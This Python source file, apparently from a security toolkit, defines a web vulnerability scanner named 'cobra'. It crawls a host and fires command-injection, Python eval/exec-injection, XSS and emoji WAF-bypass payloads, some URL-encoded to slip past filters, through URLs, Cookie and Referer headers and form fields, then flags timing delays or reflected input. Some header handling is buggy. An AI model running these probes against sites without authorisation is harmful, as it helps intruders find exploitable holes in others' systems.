import re
import time
import urllib.parse
from TheSilent.clear import clear
from TheSilent.kitten_crawler import kitten_crawler
from TheSilent.puppy_requests import text

CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RED = "\033[1;31m"

def cobra(host,delay=0,crawl=1):
    clear()
    
    hits = []

    mal_command = [r"sleep 30"]

    mal_emoji = ["\U0001F47C",
                 "\U0001F525",
                 "\U0001F638",
                 "\U0001F431",
                 "\U0001F346",
                 r"&#128124;",
                 r"&#128293;",
                 r"&#128568;",
                 r"&#128049;",
                 r"&#127814;"]

    mal_python = [r"time.sleep(30)",
                  r"eval(compile('import time\ntime.sleep(30)','cobra','exec'))",
                  r"eval(compile('import os\nos.system('sleep 30')','cobra','exec'))",
                  r"__import__('time').sleep(30)",
                  r"__import__('os').system('sleep 30')",
                  r'eval("__import__(\'time\').sleep(30)")',
                  r'eval("__import__(\'os\').system(\'sleep 30\')")',
                  r'exec("__import__(\'time\').sleep(30)")',
                  r'exec("__import__(\'os\').system(\'sleep 30\')")',
                  r'exec("import time\ntime.sleep(30)")',
                  r'exec("import os\nos.system(\'sleep 30\')")']
    
    mal_xss = [r"<iframe>Cobra</iframe>",
               r"<p>cobra</p>",
               r"<script>alert('Cobra')</script>",
               r"<script>await sleep(30);</script>",
               r"<script>prompt('Cobra')</script>",
               r"<strong>cobra</strong>",
               r"<style>body{background-color:red;}</style>",
               r"<title>cobra</title>"]

    # obfuscate command injection
    new_mal_command = []
    for mal in mal_command:
        new_mal_command.append(urllib.parse.quote(mal))
        new_mal_command.append(urllib.parse.quote(urllib.parse.quote(mal)))

    for mal in new_mal_command:
        mal_command.append(mal)

    mal_command = list(set(mal_command[:]))

    # obfuscate python injection
    new_mal_python = []
    for mal in mal_python:
        new_mal_python.append(urllib.parse.quote(mal))
        new_mal_python.append(urllib.parse.quote(urllib.parse.quote(mal)))

    for mal in new_mal_python:
        mal_python.append(mal)

    mal_python = list(set(mal_python[:]))

    # obfuscate xss
    new_mal_xss = []
    for mal in mal_xss:
        new_mal_xss.append(urllib.parse.quote(mal))
        new_mal_xss.append(urllib.parse.quote(urllib.parse.quote(mal)))

    for mal in new_mal_xss:
        mal_xss.append(mal)

    mal_xss = list(set(mal_xss[:]))

    print(CYAN + f"crawling: {host}")
    hosts = kitten_crawler(host,delay,crawl)
            
    hosts = list(dict.fromkeys(hosts[:]))
    clear()
    for _ in hosts:
        if urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(_).netloc:
            print(CYAN + f"checking: {_}")
            try:
                forms = re.findall("<form.+form>",text(_).replace("\n",""))

            except:
                forms = []

            # check for command injection
            for mal in mal_command:
                print(CYAN + f"checking {_} with payload {mal}")
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_ + "/" + mal, timeout = 120)
                    end = time.time()
                    if end - start >= 25:
                        hits.append(f"command injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Cookie",mal}, timeout = 120)
                    end = time.time()
                    if end - start >= 25:
                        hits.append(f"command injection in cookie ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Referer",mal}, timeout = 120)
                    end = time.time()
                    if end - start >= 25:
                        hits.append(f"command injection in referer ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall("<input.+?>",form)
                    try:
                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict,timeout=120)
                                    end = time.time()
                                    if end - start >= 25:
                                        hits.append(f"command injection in forms: {action} | {field_dict}")

                                else:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict,timeout=120)
                                    end = time.time()
                                    if end - start >= 25:
                                        hits.append(f"command injection in forms: {_} | {field_dict}")

                    except:
                        pass

            # check for emoji injection- unicode WAF bypass
            for mal in mal_emoji:
                print(CYAN + f"checking {_} with payload {mal}")
                try:
                    time.sleep(delay)
                    data = text(_ + "/" + mal)
                    if mal in data:
                        hits.append(f"emoji injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    data = text(_, headers = {"Cookie",mal})
                    if mal in data:
                        hits.append(f"emoji injection in cookie ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    data = text(_, headers = {"Referer",mal})
                    if mal in data:
                        hits.append(f"emoji injection in referer ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall("<input.+?>",form)
                    try:
                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action:
                                    data = text(action,method=method_field,data=field_dict)
                                    if mal in data:
                                        hits.append(f"emoji injection in forms: {action} | {field_dict}")

                                else:
                                    data = text(action,method=method_field,data=field_dict)
                                    if mal in data:
                                        hits.append(f"emoji injection in forms: {_} | {field_dict}")

                    except:
                        pass

            # check for python injection
            for mal in mal_python:
                print(CYAN + f"checking {_} with payload {mal}")
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_ + "/" + mal, timeout = 120)
                    end = time.time()
                    if end - start >= 25:
                        hits.append(f"python injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Cookie",mal}, timeout = 120)
                    end = time.time()
                    if end - start >= 25:
                        hits.append(f"python injection in cookie ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Referer",mal}, timeout = 120)
                    end = time.time()
                    if end - start >= 25:
                        hits.append(f"python injection in referer ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall("<input.+?>",form)
                    try:
                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict,timeout=120)
                                    end = time.time()
                                    if end - start >= 25:
                                        hits.append(f"python injection in forms: {action} | {field_dict}")

                                else:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict,timeout=120)
                                    end = time.time()
                                    if end - start >= 25:
                                        hits.append(f"python injection in forms: {_} | {field_dict}")

                    except:
                        pass

            # check for xss
            for mal in mal_xss:
                print(CYAN + f"checking {_} with payload {mal}")
                try:
                    time.sleep(delay)
                    data = text(_ + "/" + mal)
                    if mal in data:
                        hits.append(f"xss in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    data = text(_, headers = {"Cookie",mal})
                    if mal in data:
                        hits.append(f"xss in cookie ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    data = text(_, headers = {"Referer",mal})
                    if mal in data:
                        hits.append(f"xss in referer ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall("<input.+?>",form)
                    try:
                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action:
                                    data = text(action,method=method_field,data=field_dict)
                                    if mal in data:
                                        hits.append(f"xss in forms: {action} | {field_dict}")

                                else:
                                    data = text(action,method=method_field,data=field_dict)
                                    if mal in data:
                                        hits.append(f"xss in forms: {_} | {field_dict}")

                    except:
                        pass

    clear()
    hits = list(set(hits[:]))
    hits.sort()

    if len(hits) > 0:
        for hit in hits:
            print(RED + hit)
            with open("cobra.log", "a") as file:
                file.write(hit + "\n")

    else:
        print(GREEN + f"we didn't find anything interesting on {host}")
        with open("cobra.log", "a") as file:
                file.write(f"we didn't find anything interesting on {host}\n")
